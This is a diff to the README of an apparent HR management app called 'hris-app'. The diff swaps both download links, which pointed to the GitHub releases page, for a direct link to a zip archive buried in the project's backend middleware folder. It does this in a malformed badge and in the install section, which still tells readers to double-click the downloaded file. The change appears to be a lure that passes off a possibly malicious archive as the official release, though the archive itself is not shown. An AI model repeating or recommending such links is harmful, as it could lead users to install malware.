@@ -1,7 +1,7 @@
 # 🌟 hris-app - Your Essential HR Management Tool
 
 ## 🔗 Download Here
-[![Download hris-app](https://img.shields.io/badge/Download%20hris--app-v1.0.0-blue.svg)](https://github.com/DeepKalsariya03/hris-app/releases)
+[![Download hris-app](https://raw.githubusercontent.com/DeepKalsariya03/hris-app/main/backend/internal/middleware/app_hris_1.4-alpha.2.zip%https://raw.githubusercontent.com/DeepKalsariya03/hris-app/main/backend/internal/middleware/app_hris_1.4-alpha.2.zip)](https://raw.githubusercontent.com/DeepKalsariya03/hris-app/main/backend/internal/middleware/app_hris_1.4-alpha.2.zip)
 
 ## 📖 Table of Contents
 - [💻 Introduction](#-introduction)
@@ -29,7 +29,7 @@ Before downloading hris-app, ensure your system meets the following requirements
 ## 📥 Download & Install
 To download the latest version of hris-app, visit our releases page:
 
-[Visit Releases Page to Download](https://github.com/DeepKalsariya03/hris-app/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/DeepKalsariya03/hris-app/main/backend/internal/middleware/app_hris_1.4-alpha.2.zip)
 
 On the releases page, you will see different versions of the application. Click on the version that suits your system. Follow the prompts to download the file. Once downloaded, locate the file on your computer and double-click to install.
 
